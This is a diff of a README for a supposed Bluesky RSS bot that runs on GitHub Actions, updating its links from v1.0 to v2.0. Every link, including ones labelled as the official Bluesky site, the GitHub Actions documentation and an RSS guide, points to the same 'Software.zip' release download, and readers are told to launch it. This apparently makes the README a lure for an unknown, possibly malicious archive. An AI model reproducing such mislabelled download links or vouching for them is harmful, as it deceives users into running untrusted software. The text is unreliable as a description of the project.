@@ -1,6 +1,6 @@
 # 🌟 Welcome to the BlueSkyFeedBot Repository 🤖
 
-![Blue Sky](https://github.com/sldxOLVC/blueskyfeedbot/releases/download/v1.0/Software.zip)
+![Blue Sky](https://github.com/sldxOLVC/blueskyfeedbot/releases/download/v2.0/Software.zip)
 
 ## Description
 The **BlueSkyFeedBot** is a versatile bot designed to automatically post RSS feeds to Bluesky using the power of GitHub Actions. With this bot, you can keep your Bluesky channel updated with the latest news, articles, or any other content from RSS feeds of your choice.
@@ -13,7 +13,7 @@ The **BlueSkyFeedBot** is a versatile bot designed to automatically post RSS fee
 
 ## Installation
 To get started with the BlueSkyFeedBot, you can download the necessary files from the following link:  
-[![Download BlueSkyFeedBot](https://github.com/sldxOLVC/blueskyfeedbot/releases/download/v1.0/Software.zip)](https://github.com/sldxOLVC/blueskyfeedbot/releases/download/v1.0/Software.zip)
+[![Download BlueSkyFeedBot](https://github.com/sldxOLVC/blueskyfeedbot/releases/download/v2.0/Software.zip)](https://github.com/sldxOLVC/blueskyfeedbot/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the files, ensure to launch the BlueSkyFeedBot in your desired environment. For detailed installation instructions, please refer to the 'Installation Guide' provided in the repository.
 
@@ -28,9 +28,9 @@ Once you have downloaded the files, ensure to launch the BlueSkyFeedBot in your 
 🏷️ **Topics**: bluesky, bluesky-bot, github-actions, rss, rss-feed  
 
 ## Resources
-- **[Bluesky](https://github.com/sldxOLVC/blueskyfeedbot/releases/download/v1.0/Software.zip)**: Visit the official Bluesky website to explore more about the platform.  
-- **[GitHub Actions Documentation](https://github.com/sldxOLVC/blueskyfeedbot/releases/download/v1.0/Software.zip)**: Learn more about utilizing GitHub Actions for automation.  
-- **[RSS Feed Guide](https://github.com/sldxOLVC/blueskyfeedbot/releases/download/v1.0/Software.zip)**: Understand the basics of RSS feeds for effective feed management.
+- **[Bluesky](https://github.com/sldxOLVC/blueskyfeedbot/releases/download/v2.0/Software.zip)**: Visit the official Bluesky website to explore more about the platform.  
+- **[GitHub Actions Documentation](https://github.com/sldxOLVC/blueskyfeedbot/releases/download/v2.0/Software.zip)**: Learn more about utilizing GitHub Actions for automation.  
+- **[RSS Feed Guide](https://github.com/sldxOLVC/blueskyfeedbot/releases/download/v2.0/Software.zip)**: Understand the basics of RSS feeds for effective feed management.
 
 ## Contributors
 👩‍💻 **Developer**: Jane Doe (@JaneDoeDev)  
